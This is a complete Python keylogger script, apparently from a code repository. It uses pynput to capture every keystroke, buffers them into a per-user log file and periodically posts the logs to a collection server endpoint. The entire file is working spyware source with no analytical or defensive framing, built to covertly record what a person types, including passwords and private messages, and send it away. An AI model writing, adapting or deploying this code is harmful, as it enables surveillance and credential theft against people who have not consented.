from pynput.keyboard import Key, Listener
import requests
import os
import requests
import json
import sys

# user = 'ashwin'
user = ''
# logFilePath = './'+user+'_log.out'
logFilePath = ''

MAX_BUFFER_LEN = 10
SEND_WRITE_COUNT = 3

buffer = []
writeCount = []

serverPath = 'http://localhost:5001'

def initialize():
  logFile = open(logFilePath, 'w')
  logFile.close()

def onKeyPress(key):
  if(key==Key.enter):
    buffer.append('\n')

  elif(key == Key.space):
    buffer.append(' ')

  elif(key == Key.backspace):
    if(len(buffer) == 0):
      logFile = open(logFilePath, 'a')
      if(logFile.tell() != 0):
        logFile.seek(logFile.tell() - 1, os.SEEK_SET)
        logFile.truncate()
      logFile.close()
    else:
      buffer.pop()

  elif(len(str(key)) == 3):
    buffer.append(str(key)[1])
  
  if(len(buffer) == MAX_BUFFER_LEN):
    logFile = open(logFilePath, 'a')
    data = "".join(buffer)
    logFile.write(data)
    buffer[:]=[]
    logFile.close()

    writeCount.append(1)
  
    if(len(writeCount) == SEND_WRITE_COUNT):
      writeCount[:] = []
      sendDataToServer()


def sendDataToServer():
  logFile = open(logFilePath, 'r')
  newKeylogs = logFile.read()
  
  data = {
    'keylogs': newKeylogs,
    'user': user
  }

  try:
    res = requests.post(serverPath+'/sendData', data=data)
    res.raise_for_status()

  except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError, requests.exceptions.RequestException):
    return print("Error connecting to server")

  responseData = res.json()

  if(responseData['success'] == 1):
    open(logFilePath, 'w')

if __name__ == "__main__":
  if(len(sys.argv) < 2):
    print("[ERROR] Invalid usage")
    print("[INFO] Correct usage: python keylogger.pyw <user>")
    exit(0)
    
  user = sys.argv[1]
  logFilePath = './'+user+'_log.out'

  initialize()

  with Listener(on_press=onKeyPress) as listener:
    listener.join()

